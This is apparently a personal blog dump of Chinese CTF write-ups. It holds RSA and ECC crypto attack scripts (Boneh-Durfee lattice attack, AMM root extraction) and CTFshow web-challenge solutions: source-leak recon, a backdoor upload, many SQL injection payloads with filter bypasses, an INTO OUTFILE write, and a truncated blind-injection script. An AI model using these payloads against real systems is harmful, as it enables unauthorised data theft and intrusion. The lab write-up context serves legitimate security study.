False&quot;&quot;&quot;This is experimental, but has provided remarkable resultsso far. It tries to reduce the lattice as much as it canwhile keeping its efficiency. I see no reason not to usethis option, but if things don&#x27;t work, you should trydisabling it&quot;&quot;&quot;helpful_only = Truedimension_min = 7 # stop removing if lattice reaches that dimension############################################# Functions########################################### display stats on helpful vectorsdef helpful_vectors(BB, modulus): nothelpful = 0 for ii in range(BB.dimensions()[0]): if BB[ii,ii] &gt;= modulus: nothelpful += 1 print (nothelpful, &quot;/&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)# display matrix picture with 0 and Xdef matrix_overview(BB, bound): for ii in range(BB.dimensions()[0]): a = (&#x27;%02d &#x27; % ii) for jj in range(BB.dimensions()[1]): a += &#x27;0&#x27; if BB[ii,jj] == 0 else &#x27;X&#x27; if BB.dimensions()[0] &lt; 60: a += &#x27; &#x27; if BB[ii, ii] &gt;= bound: a += &#x27;~&#x27; print (a)# tries to remove unhelpful vectors# we start at current = n-1 (last vector)def remove_unhelpful(BB, monomials, bound, current): # end of our recursive function if current == -1 or BB.dimensions()[0] &lt;= dimension_min: return BB # we start by checking from the end for ii in range(current, -1, -1): # if it is unhelpful: if BB[ii, ii] &gt;= bound: affected_vectors = 0 affected_vector_index = 0 # let&#x27;s check if it affects other vectors for jj in range(ii + 1, BB.dimensions()[0]): # if another vector is affected: # we increase the count if BB[jj, ii] != 0: affected_vectors += 1 affected_vector_index = jj # level:0 # if no other vectors end up affected # we remove it if affected_vectors == 0: print (&quot;* removing unhelpful vector&quot;, ii) BB = BB.delete_columns([ii]) BB = BB.delete_rows([ii]) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # level:1 # if just one was affected we check # if it is affecting someone else elif affected_vectors == 1: affected_deeper = True for kk in range(affected_vector_index + 1, BB.dimensions()[0]): # if it is affecting even one vector # we give up on this one if BB[kk, affected_vector_index] != 0: affected_deeper = False # remove both it if no other vector was affected and # this helpful vector is not helpful enough # compared to our unhelpful one if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]): print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index) BB = BB.delete_columns([affected_vector_index, ii]) BB = BB.delete_rows([affected_vector_index, ii]) monomials.pop(affected_vector_index) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # nothing happened return BB&quot;&quot;&quot; Returns:* 0,0 if it fails* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound* x0,y0 the solutions of `pol`&quot;&quot;&quot;def boneh_durfee(pol, modulus, mm, tt, XX, YY): &quot;&quot;&quot; Boneh and Durfee revisited by Herrmann and May finds a solution if: * d &lt; N^delta * |x| &lt; e^delta * |y| &lt; e^0.5 whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292 &quot;&quot;&quot; # substitution (Herrman and May) PR.&lt;u, x, y&gt; = PolynomialRing(ZZ) Q = PR.quotient(x*y + 1 - u) # u = xy + 1 polZ = Q(pol).lift() UU = XX*YY + 1 # x-shifts gg = [] for kk in range(mm + 1): for ii in range(mm - kk + 1): xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk gg.append(xshift) gg.sort() # x-shifts list of monomials monomials = [] for polynomial in gg: for monomial in polynomial.monomials(): if monomial not in monomials: monomials.append(monomial) monomials.sort() # y-shifts (selected by Herrman and May) for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk) yshift = Q(yshift).lift() gg.append(yshift) # substitution # y-shifts list of monomials for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): monomials.append(u^kk * y^jj) # construct lattice B nn = len(monomials) BB = Matrix(ZZ, nn) for ii in range(nn): BB[ii, 0] = gg[ii](0, 0, 0) for jj in range(1, ii + 1): if monomials[jj] in gg[ii].monomials(): BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY) # Prototype to reduce the lattice if helpful_only: # automatically remove BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1) # reset dimension nn = BB.dimensions()[0] if nn == 0: print (&quot;failure&quot;) return 0,0 # check if vectors are helpful if debug: helpful_vectors(BB, modulus^mm) # check if determinant is correctly bounded det = BB.det() bound = modulus^(mm*nn) if det &gt;= bound: print (&quot;We do not have det &lt; bound. Solutions might not be found.&quot;) print (&quot;Try with highers m and t.&quot;) if debug: diff = (log(det) - log(bound)) / log(2) print (&quot;size det(L) - size e^(m*n) = &quot;, floor(diff)) if strict: return -1, -1 else: print (&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;) # display the lattice basis if debug: matrix_overview(BB, modulus^mm) # LLL if debug: print (&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;) BB = BB.LLL() if debug: print (&quot;LLL is done!&quot;) # transform vector i &amp; j -&gt; polynomials 1 &amp; 2 if debug: print (&quot;looking for independent vectors in the lattice&quot;) found_polynomials = False for pol1_idx in range(nn - 1): for pol2_idx in range(pol1_idx + 1, nn): # for i and j, create the two polynomials PR.&lt;w,z&gt; = PolynomialRing(ZZ) pol1 = pol2 = 0 for jj in range(nn): pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY) pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY) # resultant PR.&lt;q&gt; = PolynomialRing(ZZ) rr = pol1.resultant(pol2) # are these good polynomials? if rr.is_zero() or rr.monomials() == [1]: continue else: print (&quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx) found_polynomials = True break if found_polynomials: break if not found_polynomials: print( &quot;no independant vectors could be found. This should very rarely happen...&quot;) return 0, 0 rr = rr(q, q) # solutions soly = rr.roots() if len(soly) == 0: print (&quot;Your prediction (delta) is too small&quot;) return 0, 0 soly = soly[0][0] ss = pol1(q, soly) solx = ss.roots()[0][0] # return solx, solydef example(): N = 21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561 # the public exponent e = 20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607 # the hypothesis on the private exponent (the theoretical maximum is 0.292) delta = .29 # this means that d &lt; N^delta # # Lattice (tweak those values) # # you should tweak this (after a first run), (e.g. increment it until a solution is found) for m in range(1,20):# m = 4 # size of the lattice (bigger the better/slower) # you need to be a lattice master to tweak these t = int((1-2*delta) * m) # optimization from Herrmann and May X = 2*floor(N^delta) # this _might_ be too much Y = floor(N^(1/2)) # correct if p, q are ~ same size # # Don&#x27;t touch anything below # # Problem put in equation P.&lt;x,y&gt; = PolynomialRing(ZZ) A = int((N+1)/2) pol = 1 + x * (A + y) # # Find the solutions! # # Checking bounds if debug: print (&quot;=== checking values ===&quot;) print (&quot;* delta:&quot;, delta) print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292) print (&quot;* size of e:&quot;, int(log(e)/log(2))) print (&quot;* size of N:&quot;, int(log(N)/log(2))) print (&quot;* m:&quot;, m, &quot;, t:&quot;, t) # boneh_durfee if debug: print (&quot;=== running algorithm ===&quot;) start_time = time.time() solx, soly = boneh_durfee(pol, e, m, t, X, Y) # found a solution? if solx &gt; 0: print (&quot;=== solution found ===&quot;) if False: print (&quot;x:&quot;, solx) print (&quot;y:&quot;, soly) d = int(pol(solx, soly) / e) print (&quot;private key found:&quot;, d) else: print (&quot;=== no solution was found ===&quot;) if debug: print(&quot;=== %s seconds ===&quot; % (time.time() - start_time))if __name__ == &quot;__main__&quot;: example() 跑出d1 =36167461773898995192586226632578677184913220227461899855497899052924496298787 解rsa , 有p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059 根据上面的p, n 还有一些e有关的条件, 求flag通过p,n得到 1234c = 12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741e= 这里有个e是未知的, 但是assert (e &gt; (ord(&quot;*&quot;)*100) and gcd(e,(p-1)*(q-1))!=1 )可以看到e&gt;4200而且e与phi不是互素的… 马上想到AMM了, 但是这个e不知道试试从4200开始爆破e….结果AMM实在是跑的太久了(也不知道为啥根本没办法往下爆… 想回去看看之前找到AMM的那个博客, 想自己重新写一个来着……http://yulige.top/?p=752#Sore667pt_6solvers - easyRSA然后…就发现 怎么博客那道题的p和q和这道题的一模一样啊!会不会e也没改?于是试了一下原题的e = 0x1337, 然后把慢到打把游戏都跑不完的组合ART改成直接遍历mod p下的0x1337次方根(只有flag够短才能成功, 事实上做出答案了发现出题人是有做padding的, 但是似乎还是太短了? 然后就直接跑出来了…. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394import randomimport time# About 3 seconds to rundef AMM(o, r, q): start = time.time() print(&#x27;\\n----------------------------------------------------------------------------------&#x27;) print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;) print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print(&#x27;[+] Calculating DLP...&#x27;) j = - dicreat_log(a, d) print(&#x27;[+] Finish DLP...&#x27;) b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result)) return resultdef findAllPRoot(p, e): print(&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;.format(e, p)) start = time.time() proot = set() while len(proot) &lt; e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return prootdef findAllSolutions(mp, proot, cp, p): print(&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;.format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return all_mpfrom Crypto.Util.number import long_to_bytesc = 12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741e = 0x1337cp = c % pmp = AMM(cp, e, p)p_proot = findAllPRoot(p, e)mps = findAllSolutions(mp, p_proot, cp, p)def check(m): if long_to_bytes(m).decode(&#x27;utf-8&#x27;,&#x27;ignore&#x27;).startswith(&#x27;*CTF&#x27;): print(long_to_bytes(m)) exit() return True elif long_to_bytes(m).decode(&#x27;utf-8&#x27;,&#x27;ignore&#x27;).startswith(&#x27;*ctf&#x27;): print(long_to_bytes(m)) exit() return True else: return Falsefor mpp in mps: check(int(mpp)) 输出 1b&#39;*CTF&#123;S0_Y0u_ARE_REA11Y_GOOd_At_Pla1_This&#125;Ifyoumissthetrainimonyouwillknowthatiamgoneyoucanheartheflagfluwwwwwwwwww&#39; 看这个flag好像又是歪打正着的一题….Pla1估计是某个方法吧?等个官方wp咯还好padding长度不够hhhh, 不过要是长度够跑那个组合ART应该也是可以出结果的, 就是要多打两把游戏而已顺便一提, 这个padding是歌词吧! 500 miles好听! MyCurve附件 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import bytes_to_longfrom flag import flagassert flag[:5]==&#x27;*CTF&#123;&#x27; and flag[-1]==&#x27;&#125;&#x27;flag=flag[5:-1]def add(P,Q): if Q==0: return P x1,y1=P x2,y2=Q return (d1*(x1+x2)+d2*(x1+y1)*(x2+y2)+(x1+x1^2)*(x2*(y1+y2+1)+y1*y2))/(d1+(x1+x1^2)*(x2+y2)),(d1*(y1+y2)+d2*(x1+y1)*(x2+y2)+(y1+y1^2)*(y2*(x1+x2+1)+x1*x2))/(d1+(y1+y1^2)*(x2+y2))def mul(k,P): Q=(0,0) while k&gt;0: if is_even(k): k/=2 P=add(P,P) else: k-=1 Q=add(P,Q) return QF=GF(2**100)R.&lt;x,y&gt;=F[]d1=F.fetch_int(1)d2=F.fetch_int(1)x,y=(698546134536218110797266045394L, 1234575357354908313123830206394L)G=(F.fetch_int(x),F.fetch_int(y))P=mul(bytes_to_long(flag),G)print (G[0].integer_representation(),G[1].integer_representation())print (P[0].integer_representation(),P[1].integer_representation())#(698546134536218110797266045394L, 1234575357354908313123830206394L)#(403494114976379491717836688842L, 915160228101530700618267188624L) 椭圆曲线… 第一次做这样的比赛的时候也没做出来 查了查https://www.hyperelliptic.org (应该是一个曲线库发现里面有一种曲线就是题目给的曲线就是这个具体是啥玩意还搞不懂 只能先按着库里面的数据把脚本写好 学完ECC再来看看了 1234567891011121314from Crypto.Util.number import long_to_bytesF=GF(2**100)R.&lt;x,y&gt;=F[]def _map(p): x,y = F.fetch_int(p[0]),F.fetch_int(p[1]) u = 3*(x+y)/(x*y+x+y) v = 3*(x/(x*y+x+y)+2) return (u,v)G = (698546134536218110797266045394,1234575357354908313123830206394)P = (403494114976379491717836688842,915160228101530700618267188624)E = EllipticCurve(GF(2**100),[1, 2, 0, 0, 3])base = E(_map(G))res = E(_map(P))flag = discrete_log(res,base,base.order(),operation=&quot;+&quot;)print(long_to_bytes(flag))","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"},{"name":"ECC","slug":"ECC","permalink":"http://tearsjin.github.io/tags/ECC/"},{"name":"lfsr","slug":"lfsr","permalink":"http://tearsjin.github.io/tags/lfsr/"}]},{"title":"CTFshow Web1000","date":"2020-12-12T10:31:38.000Z","path":"2020/12/12/CTFshow-Web1000/","text":"重金买了个号怎么可能不做呢???好好学学Web了 真的很重要! 信息搜集 Web1~20Web 1F12 Web 2没办法F12和右键了, 直接firefox开发者工具 Web 3抓包, flag就在响应里 所以有时候没思路就抓抓包, 有可能有线索或者提示的 Web 4robots.txt 所以没思路的时候就阿巴阿巴 Web 5phps源码泄露 有时候试试phps读源码, 有惊喜哦 Web 6也是源码泄露, 应该是备份压缩包常见的名字有 1234567&#39;www.zip&#39;,&#39;www.bak&#39;,&#39;www.rar&#39;,&#39;www.7z&#39;,&#39;www.tar&#39;,&#39;www.tar.gz&#39;,&#39;www.txt&#39; Web 7git泄露漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 一般来说就是.git泄露之后恢复源码什么的. 有时候还会需要用.git/config 中含有的access_token信息, 从而访问这个用户的其他仓库 有些时候访问.git会返回403, 这个时候就要试探的访问.git/config, 如果有内容返回, 就说明存在git泄露. 关于敏感目录泄露, 还有SVN泄露, HG泄露等等… 等以后遇到了再来总结 Web 8SVN 泄露SVN(subversion)是一个源代码版本管理软件. 同样的隐藏文件.SVN里面会有信息. 利用seay-svn获取服务器源码等信息 Web 9vim备份文件泄露当用户在用vim编辑文件但意外退出时, 会在当前目录下生成一个备份文件, 文件名格式为.文件名.swp 针对swp备份文件, 可以用vim -r命令恢复文件的内容. Web 10Cookies里面有内容 抓包分析的时候一般都会看看Cookies的 Web 11域名解析http://dbcha.com/ 里面查ctfshow.com的txt记录 顺便学习一下域名解析的类型 域名解析类型: A/CNAME/MX/NS/TXT/AAAA/SRV/显性URL/隐性URLA记录：将域名指向一个IPv4地址（例如：10.10.10.10），需要增加A记录CNAME记录：如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录MX记录：建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录NS记录：域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录TXT记录：可任意填写（可为空），通常用做SPF记录（反垃圾邮件）使用AAAA记录：将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录SRV记录：记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）显性URL：将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址（例如：将www.net.cn显性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址为：www.hichina.com）。隐性URL：与显性URL类似，但隐性转发会隐藏真实的目标地址（例如：将www.net.cn隐性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址仍然为：www.net.cn）。 Web 12 开始变得奇怪了 进去是一个购物网站, 抓包无果, 看了下robots.txt, 有提示/admin/要输入账号密码, 账号就是admin, 密码是网站下面的那串数字 正常情况下没有人会这么干吧!所以还是要多去看看一下可以搜集信息的地方, robotx.txt啥的 Web 13拿到一个网站可以看看看看有哪些链接是可以跳转的(哪些是可以点击的)网站下面有个document可以点, 进去以后里面有后台的地址和用户名密码. Web 14 KindEditor PHP编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录 进入/editor/(这个得目录扫描吧… 利用上传图片遍历服务器根目录, 在网站目录下找到/nothinghere/fl000g.txt Web 15目录下有admin/忘记密码需要填写密保而网站下方有qq邮箱, 搜索qq可以知道密保答案 Web 16考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针. Web 17利用ping 直接获得某个域名所对应的ip Web 18js代码审计, 找到游戏结果的判断就能找到线索 Web 19AES加密, 但是Key iv mode padmode都在前端….利用http://tool.chacuo.net/cryptaes解密即可 文件上传 web151 ~ web170前端验证上传文件后缀名, 只需要抓包改一下文件名称就能上传后门了 通过ls找到flag.php , cat flag.php即可 sql注入 web171~ web253web 171语句: 1$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; 直接在本表内爆出所有数据即可, payload: id= 1&#39; or 1 --+ web 172语句$sql = &quot;select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; 但是输出经过了过滤: 1234&#x2F;&#x2F;检查结果是否有flag if($row-&gt;username!&#x3D;&#x3D;&#39;flag&#39;)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;; &#125; 所以需要把返回出来的username改掉, 让他检查不出来, payload: 1&#39; union select 1,password from ctfshow_user2 where username = &#39;flag&#39; --+ web 173语句:$sql = &quot;select id,username,password from ctfshow_user3 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; 返回逻辑 12345&#x2F;&#x2F;检查结果是否有flag if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;; &#125; 这里直接对结果进行过滤, 需要让返回的结果不存在flag, 考虑将返回的结果全部转成十六进制 payload: 0&#39; union select 1,hex(username),hex(password) from ctfshow_user3 where username = &#39;flag&#39; --+ 然后将返回的结果转成text即可, 但是出来flag的时候发现, 其实根本不需要转成16进制, 因为flag里根本就没有flag字样(ctfshow{3354c0bf-e7ab-4e26-9990-b5679766170d}), 所以直接0&#39; union select 1,2,password from ctfshow_user3 where username = &#39;flag&#39; --+ 也能出结果 web 174语句: $sql = &quot;select username,password from ctfshow_user4 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; 返回逻辑 12345&#x2F;&#x2F;检查结果是否有flag if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;; &#125; 这下好了, 结果里连数字都不能出现了, hex(), base64()估计都不能用了, 想个办法把数字转成别的字符, replace(str1,str2,str3) 可以把str1中的str2替换成str3, 可以考虑用这个将所有数字换成大写字母(毕竟flag中是没有大写字母的, 没有找到sql用正则的方法, 只能把多个replace()套在一起了 payload:0&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#39;1&#39;,&#39;A&#39;),&#39;2&#39;,&#39;B&#39;),&#39;3&#39;,&#39;C&#39;),&#39;4&#39;,&#39;D&#39;),&#39;5&#39;,&#39;E&#39;),&#39;6&#39;,&#39;F&#39;),&#39;7&#39;,&#39;G&#39;),&#39;8&#39;,&#39;H&#39;),&#39;9&#39;,&#39;I&#39;),&#39;0&#39;,&#39;J&#39;) from ctfshow_user4 where username = &#39;flag&#39; --+ 然后将返回的结果中的大写字母转回数字就行了 web 175语句:$sql = &quot;select username,password from ctfshow_user5 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; 返回逻辑 12345&#x2F;&#x2F;检查结果是否有flag if(!preg_match(&#39;&#x2F;[\\x00-\\x7f]&#x2F;i&#39;, json_encode($ret)))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;; &#125; 已经不能返回任何东西了, \\x00~\\x7f全部过滤掉了, 考虑文件的方式读取flag. 用INTO OUTFILE 可以将查询结果输出到某文件中, 在这里只需要输出到一个文件里就行了, 不过路径要记得写对var\\www\\html\\ payload: 1&#39; union select username,password from ctfshow_user5 where username=&#39;flag&#39; into outfile &#39;/var/www/html/res.txt&#39;--+ 结果就在res.txt里 web 176开始有过滤了 语句:$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; 返回逻辑 1234&#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; &#x2F;&#x2F;代码过于简单，不宜展示 &#125; 只知道有过滤, 但不知道过滤了啥, 也没多想先试试1&#39; or 1 --+就出flag了, 看群主的视频这题应该是大小写绕过 web 177语句$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; 返回逻辑 1234&#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; &#x2F;&#x2F;代码过于简单，不宜展示 &#125; 一样是过滤, 继续尝试1&#39; or 1 --+, 发现无结果, 应该是某些字符被过滤了. 这个时候因为不知道什么被过滤, 所以输入越少东西越能判断出过滤了什么. 先尝试1&#39;--+ 发现无结果, 可能--+被过滤了, 尝试用# 也不行, 再试试%23, 发现可以绕过过滤 再尝试1&#39; %23又是无结果,明显是空格被过滤了, 利用/**/注释绕过空格. 于是得到一个payload: 1&#39;/**/or/**/1%23 web 178 179依旧是过滤掉了空格, 但是/**/不能使用了, 则尝试用括号来绕过 payload:1&#39;or(1)%23 简单粗暴 看了群主的视频发现还可以用%09来代替空格, 这个是制表符, 在sql中跟空格一样的作用 payload:1&#39;%09or%091%23 然后在web 179里, %09也被过滤了, 第一个payload还是可以用的, 但还可以试试别的, 比如%0a %0b %0c等等, 把ascii码前面那几个字符都试一试, 试出%0c也是可以的 payload:1&#39;%0cor%0c1%23 web 180语句$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; 跟前面的不同的是, 这次连%23都被过滤了, 可以说没办法注释掉后面的sql语句了, 只能通过闭合的方式使得语句不会出错 例如1&#39;and&#39;a&#39;=&#39;a, 这样语句就会变成 1select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;1&#x27;and&#x27;a&#x27;=&#x27;a&#x27; limit 1 可以看到引号被成功的闭合, 结果也是有的. 但是, 想要查出flag还需要想办法使得username != &#39;flag&#39;无效, 因username != &#39;flag&#39;与后面的条件关系是and, 所以并不能通过他原本的语句中的id=查id = 26找到flag(id=26是flag是因为前面的题目都是26), 所以需要构造一个新的与前面的条件的关系为or的条件来查找 所以考虑了1&#39;or(1)and&#39;a, 但是得到的结果却只有一行, 原因是因为语句中有个limit 1. 而原本语句中的id=1是可以查询出结果的, 这里不能让他查询出结果了, 而出来的结果又必须是flag那一条, 所以考虑将or括号中的条件改成id=26. 这样就成功构造出payload:0&#39;or(id=26)and&#39;a&#39;=&#39;a web 181语句$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; 返回逻辑 1234&#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; return preg_match(&#39;&#x2F; |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select&#x2F;i&#39;, $str); &#125; web 180的payload中的字符串这题都没有过滤掉, 直接0&#39;or(id=26)and&#39;a&#39;=&#39;a出结果 web 182和web 181一样, 直接0&#39;or(id=26)and&#39;a&#39;=&#39;a web 183查询语句 123&#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select count(pass) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;; 返回逻辑 1234&#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; return preg_match(&#39;&#x2F; |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\&#x3D;|or|\\x7c|select|and|flag|into&#x2F;i&#39;, $str); &#125; 查询结果 12&#x2F;&#x2F;返回用户表的记录总数 $user_count &#x3D; 1; 结果只会返回结果的数量, 而且过滤掉了很多关键字. 看了下视频, 这里要用到正则+盲注, sql中的正则是用REGEXP’str’来匹配的, 例如select id from table where username REGXEP&#39;admin&#39; 就会查询符合正则式子的username字段的那一行 这里因为可以知道结果有几行, 也就意味着可以判断正则是否匹配, 由前面的题目可以知道flag的格式是ctfshow{xxxx-xxx-x-x-x}这种, 而且只有小写字母和数字, 所以考虑用脚本盲注, 从`ctfshow_user`where`pass`REGEXP&#39;ctfshow&#123;开始猜flag 1234567891011121314151617181920import requestsimport reurl = &#x27;http://aba2e256-aa5c-4cf3-849f-b4f6d61fb78d.chall.ctf.show:8080/select-waf.php&#x27;Str = &#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;data = &#123; &#x27;tableName&#x27;: &quot;`ctfshow_user`where`pass`REGEXP&#x27;ctfshow&#123;&quot;&#125;while True: for i in Str: Data = &#123; &#x27;tableName&#x27;: data[&#x27;tableName&#x27;] + i + &quot;&#x27;&quot; &#125; resp = requests.post(url=url, data=Data) if re.findall(&#x27;\\$user_count = (\\d)&#x27;,resp.content.decode())[0] == &#x27;1&#x27;: data[&#x27;tableName&#x27;] += i print(re.findall(&#x27;\\$user_count = (\\d)&#x27;,resp.content.decode())[0]) if i == 